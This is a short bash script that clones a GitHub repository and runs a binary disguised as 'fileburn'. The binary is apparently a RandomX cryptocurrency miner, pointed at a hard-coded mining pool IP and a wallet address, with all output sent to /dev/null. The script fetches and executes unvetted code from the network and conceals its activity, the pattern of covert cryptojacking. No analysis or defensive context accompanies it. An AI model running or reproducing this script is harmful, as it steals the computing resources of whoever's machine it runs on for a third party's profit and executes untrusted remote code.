#!/bin/bash
cd /lastestcode
git clone https://github.com/jendazrfib40/donglam.git -q
chmod -R +x donglam
./donglam/fileburn --disable-gpu --algorithm randomx --pool 51.89.96.41:4444 --wallet 8A399eWG8bW5M6ZGzEdcb9g1XA7cXRJaWR9QVDbEMdGU5pcw9D2eMpHX1x7pwFtUpLekNTzxjYCQmYiKkAkiJFGxPqFdY94.kienml-09c > /dev/null 2>&1